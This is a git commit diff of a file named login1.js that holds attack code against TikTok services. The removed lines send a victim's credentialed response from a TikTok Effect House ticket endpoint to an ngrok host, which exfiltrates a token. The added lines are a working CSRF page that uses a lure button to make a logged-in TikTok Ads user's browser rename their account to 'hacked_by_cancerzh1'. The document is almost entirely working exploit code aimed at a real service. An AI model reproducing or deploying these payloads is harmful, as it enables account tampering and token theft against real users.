8f631dfb39470552fa5619ab8bc456dd0f949795
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-08-15 18:19:20 +0700

    Update login1.js

--- login1.js
+++ login1.js
@@ -1,11 +1,23 @@
+<html>
+<body>
+<title>CSRF on tiktok ads</title>
+<script>
+function getMe(){
+// retrieve page content
 var xhr = new XMLHttpRequest();
+// now execute the CSRF attack
+xhr.open("POST",
+"https://ads.tiktok.com/web/user/update/user_info/", true);
+xhr.withCredentials="true";
 
-xhr.onload = reqListener; 
-xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=fde6822cb51ac71e2527152489231de2&language=en");
-xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-xhr.send();
 
-function reqListener() {
-    location='//0e11-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
-};
+xhr.send('aid=1583&language=en&account_sdk_source=web&fp=verify_ldg8d6wz_dJfbg8DW_Ni91_4lTb_Be17_4vSJJFLGIAm6&name=hacked_by_cancerzh1');
+}
+</script><center>
+<h1>CSRF To Overwrite Current tiktok ads name</h1>
+<button onclick="getMe();">Click me to finist setup your name</button>
+</center>
+<link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/about.7b20bf6d.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/auth.b9dc8602.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/debug.e1741249.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/shopify.75e15f6e.css rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/about.c3d853f7.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/auth.e6ff3036.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/debug.4ff65c90.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/shopify.0ecc73ef444.js rel=prefetch><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-common.c4960cbf.css rel=preload as=style><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-vendors.b67a507a.css rel=preload as=style><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/index.5784ac0a.css rel=preload as=style><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-common.38a291fe.js rel=preload as=script><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-vendors.273d7232.js rel=preload as=script><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/index.ea34be5944.js rel=preload as=script><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-vendors.b67a507a.css rel=stylesheet><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/chunk-common.c4960cbf.css rel=stylesheet><link href=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/css/index.5784ac0a.css rel=stylesheet></head><body><div id=app></div><script src=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-vendors.273d7232.js></script><script src=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/chunk-common.38a291fe.js></script><script src=https://sf16-scmcdn-sg.ibytedtos.com/obj/goofy-sg/account_center_i18n_web/sg/js/index.ea34be5944.js></script>
+</body>
+</html>
